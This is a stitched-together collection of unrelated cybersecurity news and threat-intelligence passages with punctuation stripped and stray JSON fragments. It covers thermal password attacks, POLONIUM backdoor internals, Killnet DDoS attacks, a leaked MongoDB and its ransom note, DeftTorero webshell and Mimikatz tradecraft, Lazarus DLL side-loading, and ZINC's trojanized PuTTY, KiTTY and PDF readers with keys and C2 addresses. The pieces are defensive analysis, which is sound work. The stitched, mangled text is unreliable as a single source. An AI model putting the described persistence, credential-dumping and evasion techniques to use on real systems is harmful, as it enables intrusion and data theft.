leveraging the detections provided in this post there are a few ways organizations can reduce impact of phishing attacks and compromised domains on a strategic level These includeThough these strategic elements may seem somewhat self-evident they are far from being overstated in their importance Traditional phishing techniques continue to be a reliable Initial Intrusion Vector IIV for cyberattacks and as demonstrated by the Caffeine PhaaS platform the tools to conduct full-fledged enterprise-level phishing campaigns are cheap to acquire simple to use and readily available to

help us improve our website We use Google Analytics All data is anonymisedHotjar helps us to understand and improve our users behaviour by visually representing their clicks taps and scrolling All data is anonymisedcloseComputer security experts have developed a system capable of guessing computer and smartphone users passwords in seconds by analysing the traces of heat their fingertips leave on keyboards and screensResearchers from the University of Glasgow developed the system called ThermoSecure to demonstrate how falling prices of thermal imaging cameras and rising access to machine learning are creating new risks for thermal attacksThermal attacks can occur after users type their passcode on a computer keyboard smartphone screen or ATM keypad before leaving the device unguarded A passerby equipped with a thermal camera can take a picture that reveals the heat signature of where their fingers have touched the deviceThe brighter an area appears in the thermal image the more recently it was touched By measuring the relative intensity of the warmer areas it is possible to determine the specific letters numbers or symbols that make up the password and estimate the order in which they were used From there attackers can try different combinations to crack users passwordsPrevious research by Dr Mohamed Khamis who led the development of ThermoSecure has already demonstrated that non-experts can successfully guess passwords simply by looking carefully at thermal images taken between 30 and 60 seconds after surfaces were touched In a paper published in the journal ACM Transactions on Privacy and Security Dr Khamis and the authoring team Ms Norah Alotaibi and Dr John Williamson explain how they set out to harness machine learning to make the attack process more accurate To do so they took 1500 thermal photos of recently-used QWERTY keyboards from different angles Then they trained an artificial intelligence model to effectively read the images and make informed guesses about the passwords from the heat signature clues using a probabilistic modelThrough two user studies they found that ThermoSecure was capable of revealing 86 of passwords when thermal images are taken within 20 seconds and 76 when within 30 seconds dropping to 62 after 60 seconds of entryThey also found that within 20 seconds ThermoSecure was capable of successfully attacking even long passwords of 16 characters with a rate of up to 67 correct attempts As passwords grew shorter success rates increased 12-symbol passwords were guessed up to 82 of the time eight-symbol passwords up to 93 of the time and six-symbol passwords were successful in up to 100 of attemptsDr Khamis of the University of Glasgows School of Computing Science said They say you need to think like a thief to catch a thief We developed ThermoSecure by thinking carefully about how malicious actors might exploit thermal images to break into computers and smartphones Access to thermal imaging cameras is more affordable than ever they can be found for less than 200 and machine learning is becoming increasingly accessible too That makes it very likely that people around the world are developing systems along similar lines to ThermoSecure in order to steal passwords Its important that computer security research keeps pace with these developments to find new ways to mitigate risk and we will continue to develop our technology to try to stay one step ahead of attackersWere also keen to highlight to policymakers the risks that these kind of thermal attacks pose for computer security One potential risk-reduction pathway could be to make it illegal to sell thermal cameras without some kind of enhanced security included in their software We are currently developing an AI-driven countermeasure system that could help address this issueThe researchers also looked at additional variables which made it easier for ThermoSecure to guess passwords One was the typing style of the keyboard users Hunt-and-peck keyboard users who type slowly tend to leave their fingers on the keys for longer creating heat signatures which last longer than faster touch-typists Images taken within 30 seconds of the keyboard being touched allowed ThermoSecure to successfully guess hunt-and-peck typists passwords 92 of the time but only 80 of the time for touch-typistsSecondly the type of material keyboards are made from can affect their ability to absorb heat with implications for the effectiveness of thermal attacks ThermoSecure could successfully guess passwords from the heat retained on keycaps made from ABS plastics around half of the time but only 14 of the time on keys manufactured from PBT plasticsThe ThermoSecure team has a number of suggestions for computer and smartphone users to protect themselves from thermal attacksDr Khamis added Longer passwords are more difficult for ThermoSecure to guess accurately so we would advise using long passphrases wherever possible Longer passphrases take longer to type which also makes it more difficult to get an accurate reading on a thermal camera particularly if the user is a touch typist Backlit keyboards also produce more heat making accurate thermal readings more challenging so a backlit keyboard with PBT plastics could be inherently more secureFinally users can help make their devices and keyboards more secure by adopting alternative authentication methods like fingerprint or facial recognition which mitigate many of the risks of thermal attack In my team we have previously proposed authentication schemes that rely on eye movements for password entry gaze-based authentication is resistant to thermal attacks by designThe teams paper titled ThermoSecure Investigating the effectiveness of AI-driven thermal attacks on commonly used computer keyboards is published inACM Transactions on Privacy and SecurityThe research was supported by funding from the Royal Society of Edinburgh RSE Award

to establish persistenceFigure 6 Part of the code of the loader that executes DeepCreepMegaCreep processes the same commands that we described for DeepCreep but they are stored in AES-encrypted form in the file cdtxt It has additional commands both related to the key used for decryption which are described in Table 2Table 2 List of new commands added to MegaCreepCommandDescriptionNewASKey keyReceives the decryption key key that is stored locally in Certdll only if the file doesnt already existUPKY oldkey newkeyUpdates the decryption key from oldkey to newkey The process is successful only if oldkey is the same as the key that the backdoor is currently using In this case newkey is stored locally in CertdllMegaCreep checks for these commands first which are stored unencrypted in cdtxt If none of these commands are found then the contents of cdtxt are decrypted using the key that is in Certdll After decryption all the same commands that we described for DeepCreep can be executed by MegaCreepFigure 7 Code used in MegaCreep to load username and passwordThis backdoor is a good example of the preference that POLONIUM has for using separate DLLs with specific functionality as shown in Figure 8 In the example two methods from PRLibdll are called CHP which kills running processes with the same name as the backdoors executable ie previous executions of the backdoor that are still running and XVDFv which implements persistence in the same way we described for DeepCreepFigure 8 Example of MegaCreep calling methods from separate DLLsAnother feature that was added to MegaCreep is that the output from commands executed by cmdexe is encrypted before it is uploaded to the cloud The key used for encryption is the same as the one used to decrypt commandsWe saw one case where MegaCreep was deployed using a loader WLAN-AutoConfigexe The main code for the backdoor was placed in a DLL file MainZerodll and other routines that communicate with Mega were placed in another DLL MagLibrarydll Figure 9 shows the code in the loader that calls MainZeroFigure 9 Code for MegaCreep's loaderFlipCreep is another previously undocumented backdoor written in C that has a very similar flow of execution as the other backdoors that we have described it reads commands from orderstxt a text file stored on an FTP server operated by POLONIUM and can upload or download files from the server The commands that FlipCreep can process are the same as the other backdoors with the following considerationsFigure 10 Part of the FlipCreep code to upload filesFlipCreep creates a folder with the username of the target on the FTP server along with these subfoldersPersistence is achieved in the same way as was described for DeepCreep As for string obfuscation weve seen one sample with ROT13 obfuscationTechnoCreep is a previously undocumented C backdoor that communicates with a CC server via TCP sockets In this case commands are not read from a file but received in an exchange of messages The first message is sent by the backdoor and contains initial information about the victim in the format PCNAMEUSERNAMELISTIPLISTOTHEROSTechnoCreep receives commands in an infinite loop The list of commands is shown in Table 3Table 3 List of commands supported by TechnoCreepCommandDescriptionuploadUploads a file on the victims computer to the CC server The path of the file to upload is received in a separate message If the file exists the backdoor sends Exist to which the server replies start or stop If start is received the size of the file is sent Finally the file is sent to the server as raw bytes If the message is stop nothing is done If the specified file doesnt exist NotE is sent to the serverdownloaddownloadDownloads a file from the CC server The path where the file will be saved on the victims computer is received in a separate message If NotE is received instead the process stops If the path is an absolute path and the parent folder doesnt exist then the backdoor sends NOT Otherwise it sends Exists to which the server replies by sending the size of the file Then the backdoor sends ok sleeps for 1 second and then receives the file as raw bytesExecutewithcmdexeWhen neither of the previous commands are received the message is taken as a command to be executed with cmdexe The output is sent to the serverTechnoCreep persists by copying its executable to the Startup folder as shown in Figure 11 Identical code can also be found in some versions of DeepCreep Note that no LNK files are used in this methodFigure 11 TechnoCreep code establishing persistencePapaCreep is a previously undocumented custom backdoor written in C that can receive and execute commands from a remote server via TCP sockets First seen in September 2022 this is the first backdoor used by POLONIUM that was not written in C or PowerShellPapaCreep is a modular backdoor its code has been divided in various components some of them with minimal functionalities We can summarize the main components asThe Executive and Mailman components run independently from each other and are even persisted with separate scheduled tasks in a compromised system Communication with the remote server uses raw TCP sockets but the information that is sent and received by the backdoor is contained in HTML code with a fake HTTP header Figure 12 shows that the header is hardcoded in the backdoor and Content-length is always 1024 Note that Content-Type is text-html which is not a normal valueFigure 12 Hardcoded HTTP header used by the PapaCreep backdoorThe Mailman component initiates communication with the CC server by sending PCNAME-USERNAME base64 encoded It then starts two threads one of them receives commands from the server and the other one sends any available output from the execution of commands Delimiters are used for both sending and receiving codes and codef are used to mark the start and end of the data An example of a message sent to the server with the output of a dir command is shown in Figure 13Figure 13 Example of a message sent to the CC server and the decoded contentIf the content is bigger than 1024 bytes more than one message will be transmitted In that case the first message will have the start delimiter and the final message will have the end delimiter The IP address and port of the CC server is read from a text file yettydll with the format IPaddressport base64 encodedThe CreepyUp and CreepyDown modules are not part of the main flow of execution of the backdoor and can be executed on demand They are standalone command line tools that take two arguments a local and a remote file Curiously CreepyDowns filename in compromised computers is UCLNexe and CreepyUp is DCLNexe This is similar as the commands upload and download in the FlipCreep backdoor that do the opposite of what is expected Both CreepyUp and CreepyDown read the server information from the yettydll text filePOLONIUM didnt use domain names in any of the samples that we analyzed only IP addresses Most of the servers are dedicated VPS likely purchased rather than compromised hosted at HostGW There is one special case IP address 4580149154 hosts erichmocanutv which seems to be a legitimate website It is likely that POLONIUM used this server before it was assigned to its current ownerPOLONIUM is a very active threat actor with a vast arsenal of malware tools and is constantly modifying them and developing new ones A common characteristic of several of the groups tools is the abuse of cloud services such as Dropbox Mega and OneDrive for CC communicationsIntelligence and public reports about POLONIUM are very scarce and limited likely because the groups attacks are highly targeted and the initial compromise vector is not known ESET

        "text": "A notorious pro-Russian hacking group drew headlines on Monday after launching distributed denial-of-service DDoS attacks on the websites of airports in at least 24 different states and threatening more operations against US entities Researchers at cybersecurity firm Radware said they tracked brief outages on Chicago's air travel website flychicagocom as well as the sites for Los Angeles International Airport LAX Hartsfield-Jackson Atlanta International Airport ATL and Phoenix Sky Harbor Airport PHXSeveral other website outages were reported later on Monday thanks to the DDoS attacks which flooded the seldom-used sites with junk trafficDespite the scope of the attack cybersecurity experts said the media coverage was disproportionate to the actual damage doneIn its Telegram channel on Monday the groups leaders boasted of being featured on CNN and other outletsThe goal of the attacks is not necessarily any damage to the websites McPherson told The Record but to sow panic and erode a sense of trust that those responsible for ensuring protection can do so adequatelyThis is in addition to the positive notoriety which a successful attack will have on the attacker's reputation said McPherson a senior vice president of security operations at ReliaQuestThese events differ from other general attacks as their intent is not theft of intellectual property or cyber espionage its to be purely disruptive and at times used as an extortion method or distraction from a separate attack which has yet to be revealedThe DDoS incidents on Monday involved the websites of airports in Alabama Arizona Arkansas California Colorado Connecticut Delaware Florida Georgia Hawaii Idaho Illinois Indiana Iowa Kansas Kentucky Louisiana Maryland Massachusetts Michigan Minnesota Mississippi Missouri and moreNozomi Networks senior director Gary Kinghorn said the DDoS attacks were not particularly damaging or long lasting and noted that most of the major airports appeared to be responding normally to new connection requests without delay as of early to mid-morning on MondayDDoS attacks he explained are not targeted attacks that exploit a specific vulnerability but generally just overwhelm a sites ability to respond with an enormous amount of traffic from a large number of distributed clientsKinghorn said the attacks used against the airports on Monday appeared to be what is called a SYN flood where there are a large number of connection requests that never complete and exhaust the target website's resources on incomplete connections that delay response to legitimate usersIts hard to defend against DDoS attacks because every website that is open to all users can be overwhelmed with a traffic spike of valid connection requests until you can identify and filter out a range of IP sources or expand capacity or bandwidth for the target site he saidBut several experts noted that there was no operational impact on the airports themselves only minor brief outages on the airport websites which typically carry basic information like maps as well as security line wait timesCritical Insight president Michael Hamilton called the attacks essentially an annoyance that was conducted by reasonably unsophisticated actorsHowever the Russian volunteers are not without skilled cyber actors and it may only be a question of time before more sophisticated attacks are leveled at infrastructure he saidCISA at the time warned that similar attacks were on the horizon and provided a list of the tactics Killnet operators typically useSergey Shykevich threat intelligence group manager at Check Point Software told The Record that Killnet likes to focus on the most prominent websites of the federal government but specifically on those websites where significant downtime cannot be ignored but on the other hand not protected enoughEven though Killnet didnt use sophisticated capabilities their DDoS attacks last week on US government and transportation sectors were quite successful he said We shouldnt be surprised if we see more from Killnet this weekOn its Telegram channel on Tuesday Killnet members turned their attention to DDoS attacks on JP Morgan and several related entities They also urged members to launch attacks against US civilian network infrastructure like marine terminals and logistics facilities weather monitoring centers public transportation systems and moreKillMilk the alleged founder of the group also suggested they may be planning further attacks involving more serious techniques including wiper attacks which are designed to destroy data The United States brags about its cyber training but what it really looks like and how much experience it has in cyber warfare you will see soon through our actions the groups leader boastedWe learned and broke Europe for eight months while the United States prepared to confront us We are just beginning to cause disruption in America's cyberspaceJonathan Greig is a Breaking News Reporter at

team is a stellar example of how open databases pose a great risk to businesses and consumers alikeOn September 16 researchers discovered an unprotected MongoDB instance owned by infomagcomtr an independently owned and operated licensee of Harvard Business Publishing HBP a wholly-owned subsidiary of Harvard UniversityAccording to its website Infomag publishes Bloomberg Businessweek and Harvard Business Review in TurkishHosted in Turkey the database was 39GB-strong and had over 195 million records although there were some duplicates and some data wasnt sensitiveIn total the database leaked over 152000 pieces of information pertaining to customers such as emails names links to LinkedIn Twitter and Facebook profiles and hashed passwords Some were protected by a fragile encryption algorithm like MD5 but others were encrypted using bcrypt considered a strong hashThe instance also contained 15 employee emails names and passwords protected by a weak SHA1-128bit hash Some credential pairs belonged to Harvard Business Review English hbrorg usersThe oldest entry goes as far back as 2017 and it is unclear how long this instance had been open prior to the Cybernews discoveryThe dataset also contained payment logs with emails dates bank names phone numbers and internet protocol IP addresses Infomag also stored physical addresses of some companies and private individuals as well as company tax numbersGiven a considerable portion of the stored passwords were hashed using weak password-hashing functions MD5 or SHA1 they could easily be decrypted and used for credential-stuffing attacksSHA1 Secure Hashing Algorithm 1 has been broken since 2004 and can be breached quickly by criminals at relatively little cost MD5 is an even weaker algorithm reportedly first compromised back in 1996Moreover the database contained physical addresses paired with names email addresses and phone numbers this information could be used for identity theft or harassmentThe open instance also contained some information that could harm the company itself For example the Admin indice revealed that some employees had permission to edit the Harvard Business Review Turkey hbrturkiyecom website Employee emails and credentials could be used to modify the website without confirmation or to access additional resources connected to the internetIn the wrong hands the database could also harm Infomags licensor Harvard Business Publishing as it contained some of the credentials belonging to hbrorg addressesOn September 19 Cybernews researchers went back to check whether the database was still open and learned that it had been hit by a ransomware attack meaning that criminals found the dataset before its owner had a chance to close itCrooks left a note asking for a ransom in Bitcoin and threatening to contact authorities that might fine the company for potential GDPR violationsYou must pay 001 BTC to wallet address 48 hours for recover it After 48 hours expiration we will leaked and exposed all your data In case of refusal to pay we will contact the General Data Protection Regulation GDPR and notify them that you store user data in an open form and is not safe Under the rules of the law you face a heavy fine or arrest and your base dump will be dropped from our server sic the note readsIt further gives the victim instructions on where and how to buy Bitcoin Upon further investigation the Cybernews team found that the wallet address mentioned in the note had nine transactions with five seemingly being from victims transferring 001BTC precisely the ransom amount demanded by the crooksHowever the last transaction to the criminals wallet was made on July 31 suggesting Infomag hasnt caved in to their demandsWeve reached out to both Infomag and Harvard Business Publishing for more details about the incident Harvard Business Publishing reacted instantly pointing out that while Infomag is only a licensee they take these matters seriously and have made the Turkish company aware of the information that Cybernews provided Weve repeatedly contacted Infomag too but they have yet to respondData breach monitoring platform Breachsense has indexed over 25 billion leaked credentials Its founder Josh Amishav-Zlatin says that when data leaks make the headlines its almost either a misconfigured ElasticSearch MongoDB or S3 instanceThe underlying issue is often a combination of a lack of visibility into the companys assets plus a simple misconfiguration on the server itself he told CybernewsIt could also be a simple misconfiguration where for example an IT specialist has mistakenly opened up a port to the outside world and unintentionally exposed dataThe second common error is associated with application vulnerabilities existing in a customers environment that can expose the backend database and allow hackers access Tom Neclerio VP of Professional Services at cybersecurity company SilverSky told CybernewsSensitive data could still stay secure even if unintentionally exposed However companies dont always properly encrypt data for example using outdated hashing algorithms to protect passwordsExposing sensitive data or allowing it to get into the wrong hands can have a cascading effect leading to regulatory and compliance fines potential lawsuits and legal fines reputational damage including lost customer confidence and a financial impact including lost business Neclerio saidadrotate banner5adrotate banner13Copyrightsecurityaffairs 2023"

        "text": "Solutions forThreatsCategories03 Oct 2022 minute readTable of ContentsAuthorsThe public reports available to date expose and discuss the final payload Explosive RAT and the webshells used in the initial foothold such as Caterpillar and ASPXSpy you can find webshell MD5 hashes in the IoC section with little on the tactics techniques and procedures TTPs this post focuses primarily on the TTPs used by the threat actor in intrusions between late 2019 and mid-2021 to compromise victimsMore information about DeftTorero is available to customers of Kaspersky Intelligence ReportingDuring our intrusion analysis of DeftToreros webshells such as Caterpillar we noticed traces that infer the threat actor possibly exploited a file upload form andor a command injection vulnerability in a functional or staging website hosted on the target web server This assumption is based on the fact that the uploaded webshells always drop in the same web folder and in some cases get assigned a name containing a GUID followed by the original webshell filenameIn other instances we noticed traces pointing to a possible exploitation of IIS PHP plugins pre-installed by the server admins And finally in some other instances we suspect the operators gained server credentials from other systems in the same organization and logged in using a remote desktop MSTSCexe to deploy the webshellUpon successful installation of the webshell the operators run multiple commands to gain situational awareness from the exploited system This includes testing network connectivity by pinging Googlecom listing current folders identifying the current user privileges enumerating local system users and listing websites hosted by the compromised server The operators also attempt to assess if the web server is joined andor trusted by any domain At a later stage this will prove useful as it will inform them on the next course of actions for dumping local or domain credentialsTable 1 Operator commands executed through webshellAfter gaining situational awareness the operators attempt to loadinvoke a number of tools to dump local and domain credentials In some cases the threat actor attempts to install Nmap and Advanced Port Scanner possibly to scan internal systemsCredential dumping methods differed from one case to another In some instances Lazagneexe was used in others Mimikatz variants were used either by executing the respective PE binary or by invoking a base64-encoded PowerShell version from a GitHub project In a smaller number of instances possibly due to AV detection the operators dumped the LSASSexe process to disk most probably to process it offline for credential dumpingTable 2 Operators invoking Mimikatz variantsOnce credentials are obtained it is believed the operators use Remote Desktop Protocol to pivot into internal systems or reachable systems that are likely using the stolen credentials eg trusted partners This is also reinforced by timeline analysis where the threat actor deployed a webshell at another web server in the same network without exploiting a file upload formvulnerabilityFurther commands were executed to bypass the AV engine and establish a Meterpreter session with the operators C2 server After a Meterpreter session is established the operators attempt to again invoke Mimikatz variants to gain system andor domain credentials Its worth mentioning that in older intrusions the threat actor deployed Explosive RAT instead of using MeterpreterTable 3 Operator commands to establish further presence on other servers in the same networkTable 4 Creating a shadow copyTable 5 Pattern changes in the newer Explosive RAT campaignA second noticeable change made to evade defense was introduced to the function names exported by the DLL component of Explosive RAT Below is a list of changes in the export tableTable 6 New function names compared to the old ones used in the 2015 campaignBased on our telemetry the indicators of the intrusions we assessed between late 2019 and mid-2021 are similar to the usual DeftTorero victimology with a clear focus on Middle Eastern countries such as Egypt Jordan Kuwait Lebanon Saudi Arabia Turkey and the United Arab EmiratesThe targeted web servers occasionally host multiple websites belonging to different industry verticals such as Corporate Education Government Military Media and Telcos This presents the threat actor with the opportunity to pivot to other victims of interestIn this post we described the potential tactics techniques and procedures identified in previous DeftTorero intrusions that were largely missing from public reports As our telemetry and public reports did not identify any new Explosive RAT detections after 2020 but only old slightly modified toolsets eg Explosive RAT webshells etc the historical intrusions analysis we conducted suggest a potential TTP shift by the threat actor to more filelessLOLBINS techniques and the use of knowncommon offensive tools available on the internet This TTP shift could explain the detection gap in previous years because using fileless techniques and public tools allows the operators to blend in with other threat activitiesThere are two recommended defensive measures to combat such intrusions aside from assessing web vulnerabilities namely monitoring web server file integrity and occasionally scanning web server backups we have noticed that some of the threat actor post-exploitation tools were actually inside website backups and continued to exist after the initial intrusion If the backups were restored at a later stage the threat actor could regain persistent access and continue where they left offNote We provide an incomplete list of IoCs here that are valid at the time

attacks one against personnel of a media outlet in Belgium and one against an employee of an aerospace company in the NetherlandsFigure 1 Amazon-themed document sent to the target in the NetherlandsWithin hours several malicious tools were delivered to the system including droppers loaders fully featured HTTPS backdoors HTTPS uploaders and HTTPS downloaders see the Toolset sectionRegarding the attack in Belgium the employee of a journalism company whose email address was publicly available on the companys website was contacted via an email message with the lure AWSEMEALegaldocx attached Since we didnt obtain the document we know only its name which suggests it might have been making a job offer in a legal position After opening the document the attack was triggered but stopped by ESET products immediately with just one malicious executable involved The interesting aspect here is that at that time this binary was validly signed with a code-signing certificateWe attribute both attacks to the Lazarus group with a high level of confidence This is based on the following factors which show relationships to other Lazarus campaignsThe droppers may Table 1 or may not Table 2 be side-loaded by a legitimate Microsoft process In the first case here the legitimate application is at an unusual location and the malicious component bears the name of the corresponding DLL that is among the applications imports For example the malicious DLL colouidll is side-loaded by a legitimate system application Color Control Panel colorcplexe both located at CProgramDataPTC However the usual location for this legitimate application is WINDOWSSystem32In all cases at least one command line argument is passed during runtime that serves as an external parameter required to decrypt the embedded payload Various decryption algorithms are used see the last column in Table 1 and Table 2 In several cases when AES-128 is used theres also an internal hardcoded parameter together with the name of the parent process and its DLL name all required for successful decryptionTable 1 Malicious DLLs side-loaded by a legitimate process from an unusual

dropper and an intermediate loaderThe first stage is a dropper located at CWindowsVsscreduidll and was run via a legitimate but vulnerable to DLL search-order hijacking application with the external parameter CWindowsVssWFSexe A39T8kcfkXymmAcq The program WFSexe is a copy of the Windows Fax and Scan application but its standard location is WINDOWSSystem32The goal of this intermediate stage is to load an additional payload in memory and execute it It performs this task in two steps It first reads and decrypts the configuration file CwindowsSystem32wlansvccpl which is not as its extension might suggest an encrypted executable but a data file containing chunks of 14944 bytes with configuration We didnt have the particular data from the current attack however we obtained such configuration from another Lazarus attack see Figure 5The configuration is expected to start with a double word representing the total size of the remaining buffer see Line 69 in Figure 4 below and the variable u32TotalSize followed by an array of 14944 byte-long structures containing at least two values the name of the loading DLL as a placeholder for identifying the rest of the configuration at the offset 168 of Line 74 in Figure 4 and the highlighted member in Figure 5Figure 4 The first step of decrypting the configuration file and checking if the name of the loading DLL matches the expected oneThe second step is the action of reading decrypting and loading this file that represents very likely the third and final stage It is expected to be a 64-bit executable and is loaded into the memory the same way the first-stage dropper handled the intermediate loader At the start of execution a mutex is created as a concatenation of the string GlobalAppCompatCacheObject and the CRC32 checksum of its DLL name creduidll represented as a signed integer The value should equal GlobalAppCompatCacheObject-1387282152 if wlansvccpl exists and -1387282152 otherwiseFigure 5 A configuration of the intermediate loader The highlighted file name is expected to match with the name of the running malware see also Figure 4Figure 6 Key expansion of RC6A downloader using the HTTPS protocols was

creating the OneNoteTrayLNK file located in the APPDATAMicrosoftWindowsStart MenuProgramsStartup folderThe second stage is a 32-bit VMProtect-ed module that makes an HTTP connection request to a CC server stored in its configuration see Figure 7 It uses the same User Agent Mozilla50 Windows NT 61 WOW64 Chrome280150095 Safari53736 as BLINDINGCAN RAT contains the RTTI artifact AVCHTTPProtocol but not AVCFileRW and lacks features like taking screenshots archiving files or executing a command via the command line It is able to load an executable to a newly allocated memory block and pass code execution to itFigure 7 A configuration of the HTTPS downloader The highlighted values are the size of the configuration and the number of URLs In the attack we observed all the URLs were

parameters The purpose of the first export is to establish persistence by creating OfficeSyncLNK located in APPDATAMicrosoftWindowsStart MenuProgramsStartup pointing to the malicious DLL and running its second export via rundll32exe with the parameters passed to itselfThe second export SetOfficeCert uses the first parameter as a key to decrypt the embedded payload but we couldnt extract it because the key is not known to usFigure 10 The key setup with highlighted constants suggesting the HC-128 cipherIn this attack as well as in many others attributed to Lazarus we saw that many tools were distributed even on a single targeted endpoint in a network of interest Without a doubt the team behind the attack is quite large systematically organized and well prepared For the first time in the wild the attackers were able to leverage CVE-2021-21551 for turning off the monitoring of all security solutions It was not just done in kernel space but also in a robust way using a series of little- or undocumented Windows internals Undoubtedly this required deep research development and testing skillsFrom the defenders point of view it seems easier to limit the possibilities of initial access than to block the robust toolset that would be installed after determined attackers gain a foothold in the system As in many cases in the past an employee falling prey to the attackers lure was the initial point of failure here In sensitive networks companies should insist that employees not pursue their personal agendas like job hunting on devices belonging to their companys

        "text": "April 2023 update Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather Zinc is now tracked as Diamond SleetBeginning in June 2022 ZINC employed traditional social engineering tactics by initially connecting with individuals on LinkedIn to establish a level of trust with their targets Upon successful connection ZINC encouraged continued communication over WhatsApp which acted as the means of delivery for their malicious payloadsMicrosoft Defender for Endpoint provides comprehensive protection against tools and custom malware used by ZINC including ZetaNile The hunting queries provided at the end of this blog will help customers comprehensively search their environments for relevant indicators As with any observed nation-state actor activity Microsoft directly notifies customers that have been targeted or compromised providing them with the information they need to secure their accountsZINC is a highly operational destructive and sophisticated nation-state activity group Active since 2009 the activity group gained further public notoriety in 2014 following their successful attack against Sony Pictures Entertainment ZINC is known to use a variety of custom remote access tools RATs as part of their arsenal including those detected by Microsoft as FoggyBrass and PhantomStarZINC attacks appear to be motivated by traditional cyberespionage theft of personal and corporate data financial gain and corporate network destruction ZINC attacks bear many hallmarks of state-sponsored activities such as heightened operational security sophisticated malware that evolves over time and politically motivated targetingZINC tracked by other security companies as Labyrinth Chollima and Black Artemis has been observed conducting this campaign from late April to mid-September 2022LinkedIn Threat Prevention and Defense detected ZINC creating fake profiles claiming to be recruiters working at technology defense and media entertainment companies with the goal of moving targets away from LinkedIn and to the encrypted messaging app WhatsApp for the delivery of malware ZINC primarily targeted engineers and technical support professionals working at media and information technology companies located in the UK India and the US Targets received outreach tailored to their profession or background and were encouraged to apply for an open position at one of several legitimate companies In accordance with their policies for accounts identified in these attacks LinkedIn quickly terminated any accounts associated with inauthentic or fraudulent behaviorOnce they have established a connection with their target ZINC operationalized malicious versions of two SSH clients PuTTY and KiTTY that acted as the entry vector for the ZetaNile implant Both utilities provide terminal emulator support for different networking protocols making them attractive programs for individuals commonly targeted by ZINC The weaponized versions were often delivered as compressed ZIP archives or ISO files Within that archive the recipient is provided a ReadMetxt and an executable file to run As part of the evolution of ZINCs malware development and in an effort to evade traditional defenses running the included executable does not drop the ZetaNile implant For ZetaNile to be deployed the SSH utility requires the IP provided in the ReadMetxt file An example of the content of that file is provided belowZINC has been using trojanized PuTTY as part of its attack chain for many years and this most recent variant establishes persistence on compromised devices by utilizing scheduled tasks This activity was recently reported by Mandiant The malicious PUTTYexe is configured to install the Event Horizon malware in CProgramDatacoloruidll and subsequently copy CWindowsSystem32colorcplexe to CProgramDatacolorcplexe By using DLL search order hijacking ZINC can load the second stage malware coluruidll and decode the payload with the key 0CE1241A44557AA438F27BC6D4ACA246 to be used for command and control Upon successful connection to the C2 server the attackers can install additional malware on the compromised device for other tasksLastly persistence is established with the creation of a daily scheduled task PackageColor as part of the configuration for the weaponized PuTTY ZINC accomplishes this with the following commandWhile ZINC has utilized weaponized PuTTY for many years ZINC has only recently expanded their capabilities to include weaponizing a fork of PuTTY called KiTTY The executable first collects the username and hostname of the victim system It then sends that information to a hardcoded IP 17293201253 over TCP22 which does not use SSH protocol and does not require SSH handshake to establish communication Upon successful TCP connection to the server at 13718415189 the malicious KiTTY executable then deploys the malware as AppDatamscoreedll following multiple rounds of decoding The mscoreedll file is the embedded payload detected as EventHorizon in the ZetaNile malware family Similar to ZINCs version of PuTTY the actor uses DLL search order hijacking to load malicious DLL files that perform tasks within the context of these legitimate Windows processes specifically through AppDataKiTTYPresentationHostexe -EmbeddingObjectThe mscoreedll malware is modularized in such a way that upon successful connection to the compromised C2 domain the attackers can install additional malware on the target system as needed using the existing C2 communication such as executing CProgramDataCiscofixmapiexe -s AudioEndpointBuilder to load malicious mapistubdll from the compromised C2 server The HTTP POST requests contain the hardcoded user agent string with misspelled Edge as detailed below and contain a unique ID for the field gametype and the hardcoded value for the field type for malware campaign tracking purposesBeginning in September 2022 ZINC was observed utilizing a trojanized TightVNC Viewer that was delivered to a target alongside a weaponized SSH utility over WhatsApp This malware has a unique PDBPathThe weaponized versions of TightVNC Viewer often were delivered as compressed ZIP archives or job description-themed ISO files via online platforms such as WhatsApp Within that archive the recipient is provided a ReadMetxt and an executable file to run The txt file has the following contentAs part of the threat actors latest malware technique to evade traditional defenses the malicious TightVNC Viewer has a pre-populated list of remote hosts and its configured to install the backdoor only when the user selects ec2-aet-techw-adaamazonaws from the drop-down menu in the TightVNC Viewer as shown in Figure 5The malware was configured to send the username and hostname to IP 442387484 on TCP22 as part of the victim check-in with the C2 and establish VNC connections to the same IP on port TCP5900 Once a successful connection is established to the server IP the embedded second stage DLL payload from TightVNCexe is loaded in memory to establish C2 communication to a known compromised domainZINC has operationalized malicious versions of two PDF readers Sumatra PDF and muPDFSubliminal Recording installer that act as the entry vector for the ZetaNile implant This delivery mechanism is often utilized in relation to fraudulent job postings delivered to job-seeking targets in the IT and defense sector The weaponized versions were often delivered as compressed ZIP archives Within that archive the recipient is provided with an executable file to run While the malicious Sumatra PDF reader is a fully functional PDF reader that can load the malicious implant from a fake PDF the muPDFSubliminal Recording installer can set up the backdoor without loading any malicious PDF filesThe trojanized version of Sumatra PDF Reader named SecurePDFexe has been utilized by ZINC since at least 2019 and remains a unique ZINC tradecraft SecurePDFexe is a modularized loader that can install the ZetaNile implant by loading a weaponized job application themed file with a PDF extension The fake PDF contains a header SPV005 a decryption key encrypted second stage implant payload and encrypted decoy PDF which is rendered in the Sumatra PDF Reader when the file is openedOnce loaded in memory the second stage malware is configured to send the victims system hostname and device information using custom encoding algorithms to a C2 communication server as part of the C2 check-in process The attackers can install additional malware onto the compromised devices using the C2 communication as neededWithin the trojanized version of muPDFSubliminal Recording installer setupexe is configured to check if the file path ISSetupPrerequisitesSetup64exe exists and write Ccolrctlcoloruidll on disk after extracting the embedded executable inside setupexe It then copies CWindowsSystem32ColorCplexe to CColorCtrlColorCplexe For the second stage malware the malicious installer creates a new process Ccolorctrlcolorcplexe C3A9B30B6A313F289297C9A36730DB6D and the argument C3A9B30B6A313F289297C9A36730DB6D gets passed on to coloruidll as a decryption key The DLL coloruidll which Microsoft is tracking as the EventHorizon malware family is injected into CWindowsSystemcredwizexe or iexpressexe to send C2 HTTP requests as part of the victim check-in process and to get an additional payloadMicrosoft will continue to monitor ZINC activity and implement protections for our customers The current detections and IOCs in

